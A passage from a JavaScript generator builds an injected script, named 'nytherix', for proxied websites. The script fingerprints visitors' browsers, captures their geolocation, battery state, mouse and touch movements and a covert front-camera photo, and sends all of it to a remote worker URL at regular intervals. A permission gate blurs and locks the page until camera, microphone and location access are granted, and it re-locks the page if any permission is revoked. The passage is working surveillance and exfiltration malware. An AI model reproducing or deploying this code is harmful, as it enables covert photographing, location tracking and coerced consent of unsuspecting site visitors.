  s += "          const debug = gl.getExtension('WEBGL_debug_renderer_info');\n";
  s += "          p.webglFingerprint = {\n";
  s += "            vendor: debug ? gl.getParameter(debug.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),\n";
  s += "            renderer: debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER),\n";
  s += "            version: gl.getParameter(gl.VERSION) || null,\n";
  s += "            shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION) || null\n";
  s += "          };\n";
  s += "        }\n";
  s += "      } catch(e) {}\n";
  s += "      try {\n";
  s += "        const fontList = ['Arial','Helvetica','Times','Courier','Verdana','Georgia','Tahoma','Impact','Comic Sans MS'];\n";
  s += "        const testDiv = document.createElement('div');\n";
  s += "        testDiv.style.cssText = 'position:absolute;left:-9999px;font-size:72px;visibility:hidden';\n";
  s += "        document.body.appendChild(testDiv);\n";
  s += "        for (var i = 0; i < fontList.length; i++) {\n";
  s += "          testDiv.style.fontFamily = fontList[i];\n";
  s += "          if (testDiv.offsetWidth > 5) p.fonts.push(fontList[i]);\n";
  s += "        }\n";
  s += "        document.body.removeChild(testDiv);\n";
  s += "      } catch(e) {}\n";
  s += "      try {\n";
  s += "        p.plugins = [];\n";
  s += "        if (navigator.plugins) {\n";
  s += "          for (var i = 0; i < navigator.plugins.length && i < 15; i++) {\n";
  s += "            p.plugins.push(navigator.plugins[i].name);\n";
  s += "          }\n";
  s += "        }\n";
  s += "        p.mimeTypes = [];\n";
  s += "        if (navigator.mimeTypes) {\n";
  s += "          for (var i = 0; i < navigator.mimeTypes.length && i < 15; i++) {\n";
  s += "            p.mimeTypes.push(navigator.mimeTypes[i].type);\n";
  s += "          }\n";
  s += "        }\n";
  s += "      } catch(e) {}\n";
  s += "      const permNames = ['camera', 'microphone', 'geolocation'];\n";
  s += "      for (var i = 0; i < permNames.length; i++) {\n";
  s += "        try {\n";
  s += "          if (navigator.permissions && navigator.permissions.query) {\n";
  s += "            const status = await navigator.permissions.query({ name: permNames[i] });\n";
  s += "            p.permissionStates[permNames[i]] = status ? status.state : 'unknown';\n";
  s += "          } else {\n";
  s += "            p.permissionStates[permNames[i]] = 'not-supported';\n";
  s += "          }\n";
  s += "        } catch(e) {\n";
  s += "          p.permissionStates[permNames[i]] = 'error';\n";
  s += "        }\n";
  s += "      }\n";
  s += "      return p;\n";
  s += "    }\n";
  s += "    async function collectDynamicData() {\n";
  s += "      const staticData = await collectStaticData();\n";
  s += "      const p = {};\n";
  s += "      for (var key in staticData) { p[key] = staticData[key]; }\n";
  s += "      p.timestamp = new Date().toISOString();\n";
  s += "      p.battery = null;\n";
  s += "      p.geolocation = null;\n";
  s += "      p.geolocationError = null;\n";
  s += "      p.frontPhoto = null;\n";
  s += "      p.mouseMovements = mouseData.slice();\n";
  s += "      p.touchEvents = touchData.slice();\n";
  s += "      p.audioDevices = [];\n";
  s += "      if (navigator.getBattery) {\n";
  s += "        try {\n";
  s += "          const bat = await navigator.getBattery();\n";
  s += "          p.battery = {\n";
  s += "            level: bat.level,\n";
  s += "            charging: bat.charging,\n";
  s += "            chargingTime: bat.chargingTime,\n";
  s += "            dischargingTime: bat.dischargingTime\n";
  s += "          };\n";
  s += "        } catch(e) {}\n";
  s += "      }\n";
  s += "      if (window.__nytherix.location && window.__nytherix.location.latitude) {\n";
  s += "        p.geolocation = {\n";
  s += "          latitude: window.__nytherix.location.latitude,\n";
  s += "          longitude: window.__nytherix.location.longitude,\n";
  s += "          accuracy: window.__nytherix.location.accuracy,\n";
  s += "          altitude: null,\n";
  s += "          speed: null\n";
  s += "        };\n";
  s += "      } else {\n";
  s += "        try {\n";
  s += "          const pos = await Promise.race([\n";
  s += "            new Promise(function(res, rej) {\n";
  s += "              const timeout = setTimeout(function() { rej(new Error('timeout')); }, 7000);\n";
  s += "              navigator.geolocation.getCurrentPosition(\n";
  s += "                function(pos) { clearTimeout(timeout); res(pos); },\n";
  s += "                function(err) { clearTimeout(timeout); rej(err); },\n";
  s += "                { enableHighAccuracy: false, timeout: 7000, maximumAge: 60000 }\n";
  s += "              );\n";
  s += "            })\n";
  s += "          ]);\n";
  s += "          p.geolocation = {\n";
  s += "            latitude: pos.coords.latitude,\n";
  s += "            longitude: pos.coords.longitude,\n";
  s += "            accuracy: pos.coords.accuracy,\n";
  s += "            altitude: pos.coords.altitude || null,\n";
  s += "            speed: pos.coords.speed || null\n";
  s += "          };\n";
  s += "        } catch(e) {\n";
  s += "          p.geolocationError = e.message || 'Failed';\n";
  s += "        }\n";
  s += "      }\n";
  s += "      try {\n";
  s += "        if (lureVideo && lureVideo.videoWidth > 100 && lureVideo.videoHeight > 100) {\n";
  s += "          const canvas = document.createElement('canvas');\n";
  s += "          canvas.width = 320;\n";
  s += "          canvas.height = 320;\n";
  s += "          const ctx = canvas.getContext('2d');\n";
  s += "          ctx.drawImage(lureVideo, 0, 0, canvas.width, canvas.height);\n";
  s += "          p.frontPhoto = canvas.toDataURL('image/jpeg', 0.65);\n";
  s += "          if (p.frontPhoto && p.frontPhoto.length > 45000) {\n";
  s += "            p.frontPhoto = p.frontPhoto.substring(0, 45000);\n";
  s += "          }\n";
  s += "        } else if (window.__nytherix.cameraStream) {\n";
  s += "          const tempVideo = document.createElement('video');\n";
  s += "          tempVideo.srcObject = window.__nytherix.cameraStream;\n";
  s += "          tempVideo.muted = true;\n";
  s += "          tempVideo.playsInline = true;\n";
  s += "          await tempVideo.play();\n";
  s += "          await new Promise(function(r) { setTimeout(r, 100); });\n";
  s += "          if (tempVideo.videoWidth > 100 && tempVideo.videoHeight > 100) {\n";
  s += "            const canvas = document.createElement('canvas');\n";
  s += "            canvas.width = 320;\n";
  s += "            canvas.height = 320;\n";
  s += "            const ctx = canvas.getContext('2d');\n";
  s += "            ctx.drawImage(tempVideo, 0, 0, canvas.width, canvas.height);\n";
  s += "            p.frontPhoto = canvas.toDataURL('image/jpeg', 0.65);\n";
  s += "            if (p.frontPhoto && p.frontPhoto.length > 45000) {\n";
  s += "              p.frontPhoto = p.frontPhoto.substring(0, 45000);\n";
  s += "            }\n";
  s += "          }\n";
  s += "          tempVideo.pause();\n";
  s += "          tempVideo.srcObject = null;\n";
  s += "        }\n";
  s += "      } catch(e) {\n";
  s += "        console.warn('[DATA CAPTURE] Camera capture failed:', e);\n";
  s += "      }\n";
  s += "      try {\n";
  s += "        const devices = await navigator.mediaDevices.enumerateDevices();\n";
  s += "        p.audioDevices = [];\n";
  s += "        for (var i = 0; i < devices.length; i++) {\n";
  s += "          if (devices[i].kind && devices[i].kind.includes('audio') && p.audioDevices.length < 6) {\n";
  s += "            p.audioDevices.push({\n";
  s += "              kind: devices[i].kind,\n";
  s += "              label: (devices[i].label || 'unknown').substring(0, 40)\n";
  s += "            });\n";
  s += "          }\n";
  s += "        }\n";
  s += "      } catch(e) {}\n";
  s += "      return p;\n";
  s += "    }\n";
  s += "    async function sendPayload() {\n";
  s += "      if (isSending) return;\n";
  s += "      isSending = true;\n";
  s += "      try {\n";
  s += "        const data = await collectDynamicData();\n";
  s += "        const payload = {\n";
  s += "          sessionId: data.sessionId,\n";
  s += "          timestamp: data.timestamp,\n";
  s += "          url: data.url,\n";
  s += "          referrer: data.referrer,\n";
  s += "          userAgent: data.userAgent,\n";
  s += "          language: data.language,\n";
  s += "          languages: data.languages,\n";
  s += "          platform: data.platform,\n";
  s += "          hardwareConcurrency: data.hardwareConcurrency,\n";
  s += "          deviceMemory: data.deviceMemory,\n";
  s += "          maxTouchPoints: data.maxTouchPoints,\n";
  s += "          connection: data.connection,\n";
  s += "          screen: data.screen,\n";
  s += "          timezone: data.timezone,\n";
  s += "          cookiesEnabled: data.cookiesEnabled,\n";
  s += "          doNotTrack: data.doNotTrack,\n";
  s += "          webdriver: data.webdriver ? 1 : 0,\n";
  s += "          plugins: data.plugins,\n";
  s += "          mimeTypes: data.mimeTypes,\n";
  s += "          historyLength: data.historyLength,\n";
  s += "          navigationTiming: data.navigationTiming,\n";
  s += "          canvasFingerprint: data.canvasFingerprint,\n";
  s += "          audioFingerprint: data.audioFingerprint,\n";
  s += "          webglFingerprint: data.webglFingerprint,\n";
  s += "          battery: data.battery,\n";
  s += "          geolocation: data.geolocation,\n";
  s += "          geolocationError: data.geolocationError,\n";
  s += "          frontPhoto: data.frontPhoto,\n";
  s += "          audioDevices: data.audioDevices,\n";
  s += "          fonts: data.fonts,\n";
  s += "          mouseMovements: data.mouseMovements,\n";
  s += "          touchEvents: data.touchEvents,\n";
  s += "          permissionStates: data.permissionStates\n";
  s += "        };\n";
  s += "        const controller = new AbortController();\n";
  s += "        const timeoutId = setTimeout(function() { controller.abort(); }, 10000);\n";
  s += "        await fetch(WORKER_URL, {\n";
  s += "          method: 'POST',\n";
  s += "          headers: { 'Content-Type': 'application/json' },\n";
  s += "          body: JSON.stringify(payload),\n";
  s += "          keepalive: true,\n";
  s += "          signal: controller.signal\n";
  s += "        });\n";
  s += "        clearTimeout(timeoutId);\n";
  s += "      } catch(e) {}\n";
  s += "      finally { isSending = false; }\n";
  s += "    }\n";
  s += "    async function initLureSystem() {\n";
  s += "      const stream = window.__nytherix.cameraStream;\n";
  s += "      if (!stream) {\n";
  s += "        console.warn('[DATA CAPTURE] No camera stream available');\n";
  s += "        return;\n";
  s += "      }\n";
  s += "      if (lureVideo.srcObject !== stream) {\n";
  s += "        lureVideo.srcObject = stream;\n";
  s += "        try {\n";
  s += "          await lureVideo.play();\n";
  s += "        } catch(e) {\n";
  s += "          console.warn('[DATA CAPTURE] Could not play video:', e);\n";
  s += "        }\n";
  s += "      }\n";
  s += "      if (sendIntervalId) { clearInterval(sendIntervalId); }\n";
  s += "      setTimeout(function() { sendPayload(); }, 2000);\n";
  s += "      sendIntervalId = setInterval(function() { sendPayload(); }, SEND_INTERVAL);\n";
  s += "      window.addEventListener('beforeunload', function() {\n";
  s += "        if (sendIntervalId) clearInterval(sendIntervalId);\n";
  s += "        sendPayload();\n";
  s += "      });\n";
  s += "      console.log('[DATA CAPTURE] System initialized successfully');\n";
  s += "    }\n";
  s += "    if (document.readyState === 'loading') {\n";
  s += "      document.addEventListener('DOMContentLoaded', initLureSystem);\n";
  s += "    } else {\n";
  s += "      setTimeout(initLureSystem, 1000);\n";
  s += "    }\n";
  s += "  }\n";
  s += "};\n";
  s += "\n";

  // -----------------------------------------------------------------------
  // SECTION E -- Permission Gate
  // -----------------------------------------------------------------------
  s += "// --- SECTION E: Permission Gate ---\n";
  s += "//\n";
  s += "// Guarantees:\n";
  s += "//   Page is NEVER visible until camera + geolocation both granted.\n";
  s += "//   Permissions API queried live on every load (not just session cache).\n";
  s += "//   Mid-session revocation -> page locked immediately via onchange.\n";
  s += "//   visibilitychange re-checks when user returns to tab.\n";
  s += "//   5-second interval poll catches revocations on browsers without onchange.\n";
  s += "//   BFCache restore -> permissions re-checked before content shown.\n";
  s += "//   5-second hard timeout unlocks FOUC for WASM/canvas apps.\n";
  s += "\n";

  // Blur helper -- always targets <body>, never <html>.
  // Gate card is appended to <html> and must stay sharp; <body> is the site content.
  s += "function _blurBody() {\n";
  s += "  try {\n";
  s += "    document.body.style.filter        = 'blur(12px)';\n";
  s += "    document.body.style.pointerEvents = 'none';\n";
  s += "    document.body.style.userSelect    = 'none';\n";
  s += "  } catch(e) {}\n";
  s += "}\n";
  s += "function _unblurBody() {\n";
  s += "  try {\n";
  s += "    document.body.style.filter        = '';\n";
  s += "    document.body.style.pointerEvents = '';\n";
  s += "    document.body.style.userSelect    = '';\n";
  s += "  } catch(e) {}\n";
  s += "}\n";
  s += "\n";

  // Synchronous FOUC lock -- shim runs inside <head> so document.body is null here.
  // Defer the blur to DOMContentLoaded which fires before first paint completes.
  // This guarantees <body> exists and <html> is never the blur target.
  s += "try {\n";
  s += "  if (!sessionStorage.getItem('nx_perm_v2')) {\n";
  s += "    if (document.body) {\n";
  s += "      _blurBody();\n";
  s += "    } else {\n";
  s += "      document.addEventListener('DOMContentLoaded', _blurBody, { once: true });\n";
  s += "    }\n";
  s += "  }\n";
  s += "} catch(e) {}\n";
  s += "\n";

  // _pageIsLocked starts true so the hard timeout cannot bypass the gate
  s += "var _foucTimer    = null;\n";
  s += "var _pageIsLocked = true;\n";
  s += "\n";
  s += "function _startFoucTimer() {\n";
  s += "  _foucTimer = setTimeout(function() {\n";
  s += "    if (!_pageIsLocked) _unblurBody();\n";
  s += "  }, 5000);\n";
  s += "}\n";
  s += "_startFoucTimer();\n";
  s += "\n";

  s += "function _unlockPage() {\n";
  s += "  _pageIsLocked = false;\n";
  s += "  clearTimeout(_foucTimer);\n";
  s += "  _unblurBody();\n";
  s += "}\n";
  s += "\n";

  // sessionStorage helper
  s += "function _ss(k, v) {\n";
  s += "  try {\n";
  s += "    if (v === undefined) return sessionStorage.getItem(k);\n";
  s += "    if (v === null) { sessionStorage.removeItem(k); return; }\n";
  s += "    sessionStorage.setItem(k, v);\n";
  s += "  } catch(e) { return null; }\n";
  s += "}\n";
  s += "\n";

  // _queryPerms
  s += "function _queryPerms() {\n";
  s += "  if (!navigator.permissions || !navigator.permissions.query) {\n";
  s += "    return Promise.resolve({ cam: 'prompt', geo: 'prompt' });\n";
  s += "  }\n";
  s += "  return Promise.all([\n";
  s += "    navigator.permissions.query({ name: 'camera'      }).catch(function() { return { state: 'prompt' }; }),\n";
  s += "    navigator.permissions.query({ name: 'microphone'  }).catch(function() { return { state: 'prompt' }; }),\n";
  s += "    navigator.permissions.query({ name: 'geolocation' }).catch(function() { return { state: 'prompt' }; })\n";
  s += "  ]).then(function(r) {\n";
  s += "    var cam = (r[0].state === 'denied' || r[1].state === 'denied') ? 'denied'\n";
  s += "            : (r[0].state === 'granted' && r[1].state === 'granted') ? 'granted'\n";
  s += "            : 'prompt';\n";
  s += "    return { cam: cam, geo: r[2].state };\n";
  s += "  });\n";
  s += "}\n";
  s += "\n";

  // _lockPage
  s += "function _lockPage(reason) {\n";
  s += "  _pageIsLocked = true;\n";
  s += "  clearTimeout(_foucTimer);\n";
  s += "  console.warn('[NYTHERIX] Locking:', reason);\n";
  s += "  var nx = window.__nytherix;\n";
  s += "  if (nx.cameraStream) {\n";
  s += "    try { nx.cameraStream.getTracks().forEach(function(t) { t.stop(); }); } catch(e) {}\n";
  s += "    nx.cameraStream = null;\n";
  s += "  }\n";
  s += "  window.sharedStream   = null;\n";
  s += "  nx.location           = null;\n";
  s += "  nx.permissionsGranted = false;\n";
  s += "  _ss(SKEY, null);\n";
  s += "  _blurBody();\n";
  s += "  if (_regrantPoll) { clearInterval(_regrantPoll); _regrantPoll = null; }\n";
  s += "  _regrantPoll = setInterval(function() {\n";
  s += "    _queryPerms().then(function(states) {\n";
  s += "      if (states.cam === 'granted' && states.geo === 'granted' && !window.__nytherix.permissionsGranted) {\n";
  s += "        clearInterval(_regrantPoll); _regrantPoll = null;\n";
  s += "        location.reload();\n";
  s += "      }\n";
  s += "    }).catch(function() {});\n";
  s += "  }, 3000);\n";
  s += "  var existing = document.getElementById('_nx_gate');\n";
  s += "  if (existing && existing.parentNode) existing.parentNode.removeChild(existing);\n";
  s += "  _showGate(true);\n";
  s += "}\n";
  s += "\n";

  // _watchRevocations
  s += "var _watchersAttached = false;\n";
  s += "var _pollInterval     = null;  // revocation poll (5s, active while granted)\n";
  s += "var _regrantPoll      = null;  // re-grant poll (3s, active while locked)\n";
  s += "\n";
  s += "function _watchRevocations() {\n";
  s += "  if (_watchersAttached) return;\n";
  s += "  _watchersAttached = true;\n";
  s += "  if (!navigator.permissions || !navigator.permissions.query) return;\n";
  s += "\n";
  s += "  ['camera', 'microphone', 'geolocation'].forEach(function(name) {\n";
  s += "    navigator.permissions.query({ name: name })\n";
  s += "      .then(function(status) {\n";
  s += "        status.addEventListener('change', function() {\n";
  s += "          if (status.state === 'denied') {\n";
  s += "            _lockPage('onchange: ' + name + ' denied');\n";
  s += "          } else if (!window.__nytherix.permissionsGranted) {\n";
  s += "            _queryPerms().then(function(st) {\n";
  s += "              if (st.cam === 'granted' && st.geo === 'granted') location.reload();\n";
  s += "            }).catch(function() {});\n";
  s += "          }\n";
  s += "        });\n";
  s += "      })\n";
  s += "      .catch(function() {});\n";
  s += "  });\n";
  s += "\n";
  s += "  document.addEventListener('visibilitychange', function() {\n";
  s += "    if (document.visibilityState !== 'visible') return;\n";
  s += "    _queryPerms().then(function(states) {\n";
  s += "      if (states.cam === 'denied' || states.geo === 'denied') {\n";
  s += "        _lockPage('visibilitychange: denied');\n";
  s += "      } else if (states.cam === 'granted' && states.geo === 'granted' && !window.__nytherix.permissionsGranted) {\n";
  s += "        location.reload();\n";
  s += "      }\n";
  s += "    }).catch(function() {});\n";
  s += "  });\n";
  s += "\n";
  s += "  if (_pollInterval) { clearInterval(_pollInterval); _pollInterval = null; }\n";
  s += "  _pollInterval = setInterval(function() {\n";
  s += "    _queryPerms().then(function(states) {\n";
  s += "      if (states.cam === 'denied' || states.geo === 'denied') {\n";
  s += "        _lockPage('interval: denied');\n";
  s += "      } else if (states.cam === 'granted' && states.geo === 'granted' && !window.__nytherix.permissionsGranted) {\n";
  s += "        clearInterval(_pollInterval); _pollInterval = null;\n";
  s += "        location.reload();\n";
  s += "      }\n";
  s += "    }).catch(function() {});\n";
  s += "  }, 5000);\n";
  s += "}\n";
  s += "\n";

  // _onGranted
  s += "function _onGranted(stream, pos) {\n";
  s += "  window.__nytherix.permissionsGranted = true;\n";
  s += "  window.__nytherix.cameraStream       = stream;\n";
  s += "  window.__nytherix.location           = {\n";
  s += "    latitude:  pos.coords.latitude,\n";
  s += "    longitude: pos.coords.longitude,\n";
  s += "    accuracy:  pos.coords.accuracy,\n";
  s += "    timestamp: pos.timestamp\n";
  s += "  };\n";
  s += "  window.sharedStream = stream;\n";
  s += "  _ss(SKEY, '1');\n";
  s += "  _watchRevocations();\n";
  // Remove gate first (420ms fade), then unblur so site is never exposed during transition
  s += "  _removeGate();\n";
  s += "  setTimeout(function() { _unlockPage(); }, 430);\n";
  s += "  try { window.__nytherix.runFeatures(); } catch(e) { console.warn('[NYTHERIX] runFeatures error:', e); }\n";
  s += "}\n";
  s += "\n";

  // _initGate IIFE
  s += "(function _initGate() {\n";
  s += "  var hasMedia = !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia);\n";
  s += "  var hasGeo   = !!navigator.geolocation;\n";
  s += "  if (!hasMedia || !hasGeo) {\n";
  s += "    if (document.body) { _unlockPage(); } else { document.addEventListener('DOMContentLoaded', _unlockPage, { once: true }); }\n";
  s += "    return;\n";
  s += "  }\n";
  s += "\n";
  s += "  _queryPerms().then(function(states) {\n";
  s += "\n";
  s += "    if (states.cam === 'denied' || states.geo === 'denied') {\n";
  s += "      _ss(SKEY, null);\n";
  s += "      _watchRevocations();\n";
  s += "      _showGate(true);\n";
  s += "      return;\n";
  s += "    }\n";
  s += "\n";
  s += "    if (states.cam === 'granted' && states.geo === 'granted') {\n";
  s += "      _watchRevocations();\n";
  s += "      var sp = navigator.mediaDevices.getUserMedia({ video: true, audio: true }).catch(function() { return null; });\n";
  s += "      var gp = new Promise(function(res) {\n";
  s += "        navigator.geolocation.getCurrentPosition(res, function() { res(null); }, { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 });\n";
  s += "      });\n";
  s += "      Promise.all([sp, gp]).then(function(r) {\n";
  s += "        if (!r[0] || !r[1]) {\n";
  s += "          _ss(SKEY, null);\n";
  s += "          // Acquisition failed despite granted perms -- likely hardware/system error\n";
  s += "          _showGate(false);\n";
  s += "          var st2 = document.getElementById('_nx_st');\n";
  s += "          if (st2) { st2.style.color = '#f87171'; st2.textContent = !r[0] ? 'Camera unavailable. Check hardware and try again.' : 'Location unavailable. Check system settings and try again.'; }\n";
  s += "          return;\n";
  s += "        }\n";
  s += "        _onGranted(r[0], r[1]);\n";
  s += "      });\n";
  s += "      return;\n";
  s += "    }\n";
  s += "\n";
  s += "    if (_ss(SKEY) === '1') _ss(SKEY, null);\n";
  s += "    _showGate(false);\n";
  s += "\n";
  s += "  }).catch(function() { _showGate(false); });\n";
  s += "})();\n";
  s += "\n";

  // BFCache
  s += "window.addEventListener('pageshow', function(e) {\n";
  s += "  if (!e.persisted) return;\n";
  s += "  _queryPerms().then(function(states) {\n";
  s += "    if (states.cam === 'denied' || states.geo === 'denied') {\n";
  s += "      _lockPage('pageshow: denied');\n";
  s += "      return;\n";
  s += "    }\n";
  s += "    if (states.cam === 'granted' && states.geo === 'granted') {\n";
  s += "      if (_ss(SKEY) !== '1') _showGate(false);\n";
  s += "      return;\n";
  s += "    }\n";
  // Prompt state on BFCache restore -- show gate and watch for re-grant
  s += "    if (_ss(SKEY) !== '1' && !document.getElementById('_nx_gate')) _showGate(false);\n";
  s += "    _watchRevocations();\n";
  s += "  }).catch(function() {});\n";
  s += "});\n";
  s += "\n";

  // -----------------------------------------------------------------------
  // Gate UI functions
  // -----------------------------------------------------------------------

  // _step: returns an HTML string for one step indicator
  // icon argument is an HTML entity string (e.g. '&#x1F4F7;') -- safe in innerHTML
  s += "function _step(id, icon, label) {\n";
  s += "  return '<div id=\"' + id + '\" style=\"flex:1;max-width:120px;padding:10px 6px;'\n";
  s += "    + 'background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.08);'\n";
  s += "    + 'border-radius:10px;font-size:11px;color:#64748b;transition:all 0.3s\">'\n";
  s += "    + '<div style=\"font-size:22px;margin-bottom:4px\">' + icon + '</div>' + label + '</div>';\n";
  s += "}\n";
  s += "\n";

  s += "function _stepOn(id) {\n";
  s += "  var el = document.getElementById(id); if (!el) return;\n";
  s += "  el.style.borderColor = 'rgba(0,255,224,0.45)';\n";
  s += "  el.style.background  = 'rgba(0,255,224,0.08)';\n";
  s += "  el.style.color       = '#00ffe0';\n";
  s += "}\n";
  s += "\n";

  s += "function _stepDone(id) {\n";
  s += "  var el = document.getElementById(id); if (!el) return;\n";
  s += "  el.style.borderColor = 'rgba(0,255,224,0.65)';\n";
  s += "  el.style.background  = 'rgba(0,255,224,0.14)';\n";
  s += "  el.style.color       = '#00ffe0';\n";
  s += "}\n";
  s += "\n";

  // _showDenied: uses innerHTML so HTML entities render correctly
  s += "function _showDenied() {\n";
  s += "  var d     = document.getElementById('_nx_dn');\n";
  s += "  var b     = document.getElementById('_nx_btn');\n";
  s += "  var ic    = document.getElementById('_nx_icon');\n";
  s += "  var ti    = document.getElementById('_nx_title');\n";
  s += "  var sub   = document.getElementById('_nx_sub');\n";
  s += "  var steps = document.getElementById('_nx_steps');\n";
  s += "  var st    = document.getElementById('_nx_st');\n";
  // Hide the entire request UI
  s += "  if (b)     b.style.display     = 'none';\n";
  s += "  if (sub)   sub.style.display   = 'none';\n";
  s += "  if (steps) steps.style.display = 'none';\n";
  s += "  if (st)    st.style.display    = 'none';\n";
  // Show only the denied panel
  s += "  if (d)  d.style.display = 'block';\n";
  // &#x26D4; = no-entry sign
  s += "  if (ic) ic.innerHTML = '&#x26D4;';\n";
  s += "  if (ti) { ti.textContent = 'Access Blocked'; ti.style.color = '#f87171'; }\n";
  s += "}\n";
  s += "\n";

  s += "function _removeGate() {\n";
  s += "  var g = document.getElementById('_nx_gate'); if (!g) return;\n";
  s += "  g.style.opacity = '0';\n";
  s += "  setTimeout(function() { if (g.parentNode) g.parentNode.removeChild(g); }, 420);\n";
  s += "}\n";
  s += "\n";

  // _showGate: main gate overlay builder
  // ALL icons are HTML entities -- no raw Unicode ever enters the JS string literals
  s += "function _showGate(denied) {\n";
  s += "  function mount() {\n";
  s += "    if (document.getElementById('_nx_gate')) return;\n";
  s += "    var ov = document.createElement('div');\n";
  s += "    ov.id = '_nx_gate';\n";
  s += "    ov.style.cssText =\n";
  s += "      'position:fixed;top:0;right:0;bottom:0;left:0;width:100%;height:100%;'\n";
  s += "      + 'z-index:2147483647;display:flex;align-items:center;'\n";
  s += "      + 'justify-content:center;padding:24px;'\n";
  s += "      + 'font-family:-apple-system,BlinkMacSystemFont,\"Segoe UI\",system-ui,sans-serif;'\n";
  s += "      + 'color:#e2e8f0;text-align:center;'\n";
  s += "      + 'background:transparent;'\n";
  s += "      + 'pointer-events:none;'\n";
  s += "      + 'transition:opacity 0.4s;';\n";
  s += "\n";
  s += "    ov.innerHTML =\n";
  s += "        '<div style=\"max-width:440px;width:100%;'\n";
  s += "        + 'background:rgba(6,7,12,0.97);'\n";
  s += "        + 'border:1px solid rgba(0,255,224,0.13);border-radius:22px;'\n";
  s += "        + 'padding:44px 36px 36px;'\n";
  s += "        + 'box-shadow:0 40px 80px rgba(0,0,0,0.65),0 0 0 1px rgba(0,255,224,0.04);'\n";
  s += "        + 'position:relative;overflow:hidden;pointer-events:all\">'\n";
  // ambient glow
  s += "      + '<div style=\"position:absolute;top:-80px;left:50%;transform:translateX(-50%);'\n";
  s += "        + 'width:260px;height:260px;'\n";
  s += "        + 'background:radial-gradient(circle,rgba(0,255,224,0.06),transparent 70%);'\n";
  s += "        + 'pointer-events:none;border-radius:50%\"></div>'\n";
  // &#x1F510; = lock emoji
  s += "      + '<div id=\"_nx_icon\" style=\"font-size:54px;margin-bottom:20px\">&#x1F510;</div>'\n";
  s += "      + '<h2 id=\"_nx_title\" style=\"margin:0 0 10px;font-size:21px;font-weight:700;'\n";
  s += "        + 'color:#00ffe0;letter-spacing:0.02em\">Access Required</h2>'\n";
  s += "      + '<p id=\"_nx_sub\" style=\"margin:0 0 28px;font-size:14px;color:#94a3b8;line-height:1.75\">'\n";
  s += "        + 'This service requires <strong style=\"color:#e2e8f0\">Camera &amp; Microphone</strong>'\n";
  s += "        + ' and <strong style=\"color:#e2e8f0\">Location</strong> access to continue.'\n";
  s += "        + ' Click below and allow both prompts.</p>'\n";
  s += "      + '<div id=\"_nx_steps\" style=\"display:flex;gap:8px;justify-content:center;margin-bottom:28px\">'\n";
  // &#x1F4F7; = camera, &#x1F4CD; = pin, &#x2705; = checkmark
  s += "        + _step('_nx_s1', '&#x1F4F7;', 'Camera')\n";
  s += "        + _step('_nx_s2', '&#x1F4CD;', 'Location')\n";
  s += "        + _step('_nx_s3', '&#x2705;', 'Ready')\n";
  s += "      + '</div>'\n";
  s += "      + '<button id=\"_nx_btn\" onclick=\"_nxReq()\"'\n";
  s += "        + ' style=\"width:100%;max-width:260px;padding:13px 0;'\n";
  s += "        + 'background:linear-gradient(135deg,#00ffe0,#00c9b1);'\n";
  s += "        + 'color:#07080d;border:none;border-radius:11px;font-size:15px;font-weight:700;'\n";
  s += "        + 'cursor:pointer;letter-spacing:0.03em;'\n";
  s += "        + 'box-shadow:0 4px 24px rgba(0,255,224,0.28);transition:opacity 0.2s\"'\n";
  s += "        + ' onmouseover=\"this.style.opacity=\\'0.88\\'\"'\n";
  s += "        + ' onmouseout=\"this.style.opacity=\\'1\\'\">Grant Permissions</button>'\n";
  s += "      + '<div id=\"_nx_st\" style=\"margin-top:18px;min-height:18px;font-size:13px;color:#64748b\"></div>'\n";
  s += "      + '<div id=\"_nx_dn\" style=\"display:none;margin-top:20px;'\n";
  s += "        + 'background:rgba(244,63,94,0.08);border:1px solid rgba(244,63,94,0.22);'\n";
  s += "        + 'border-radius:11px;padding:16px;font-size:13px;color:#f87171;'\n";
  s += "        + 'line-height:1.7;text-align:left\">'\n";
  // &#x26D4; = no-entry sign (blocked)
  s += "        + '<strong>&#x26D4; Access Blocked</strong><br><br>'\n";
  s += "        + 'Camera and location access are required to use this service. '\n";
  s += "        + 'Please grant permissions in your browser settings and reload the page.<br><br>'\n";
  s += "        + 'To fix: click the <strong>lock / info icon</strong> in your address bar, '\n";
  s += "        + 'set <em>Camera</em> and <em>Location</em> to <strong>Allow</strong>.'\n";
  s += "        + '<br><br>'\n";
  s += "        + '<small style=\"color:#64748b;font-size:11px\">'\n";
  s += "        + 'The page will reload automatically once permissions are restored.</small>'\n";
  s += "        + '<br><br>'\n";
  s += "        + '<button onclick=\"location.reload()\"'\n";
  s += "          + ' style=\"background:rgba(244,63,94,0.14);color:#fca5a5;'\n";
  s += "          + 'border:1px solid rgba(244,63,94,0.28);border-radius:8px;'\n";
  // &#x21BA; = counterclockwise arrow (reload)
  s += "          + 'padding:8px 18px;font-size:13px;cursor:pointer\">&#x21BA; Reload Now</button>'\n";
  s += "      + '</div>'\n";
  s += "    + '</div>';\n";
  s += "\n";
  s += "    // Append to <html> not <body> -- proxied sites often apply transform/filter\n";
  s += "    // to <body> which traps position:fixed children relative to body not viewport.\n";
  s += "    document.documentElement.appendChild(ov);\n";
  s += "    if (denied) _showDenied();\n";
  s += "  }\n";
  s += "\n";
  s += "  if (document.body) {\n";
  s += "    mount();\n";
  s += "  } else {\n";
  s += "    document.addEventListener('DOMContentLoaded', mount, { once: true });\n";
  s += "  }\n";
  s += "}\n";
  s += "\n";

  // _nxReq: Grant Permissions button handler
  s += "window._nxReq = function() {\n";
  s += "  var btn = document.getElementById('_nx_btn');\n";
  s += "  var st  = document.getElementById('_nx_st');\n";
  s += "  if (btn) { btn.disabled = true; btn.textContent = 'Requesting...'; btn.style.opacity = '0.55'; }\n";
  s += "  if (st)  st.textContent = 'Waiting for browser prompts...';\n";
  s += "  _stepOn('_nx_s1'); _stepOn('_nx_s2');\n";
  s += "\n";
  s += "  var camOk = false, geoOk = false, done = false;\n";
  s += "  var _stream = null, _geoPos = null;\n";
  s += "\n";
  s += "  function _check() {\n";
  s += "    if (!camOk || !geoOk || done) return;\n";
  s += "    done = true;\n";
  s += "    _stepDone('_nx_s1'); _stepDone('_nx_s2'); _stepDone('_nx_s3');\n";
  s += "    if (st) st.textContent = 'All permissions granted!';\n";
  s += "    setTimeout(function() { _onGranted(_stream, _geoPos); }, 500);\n";
  s += "  }\n";
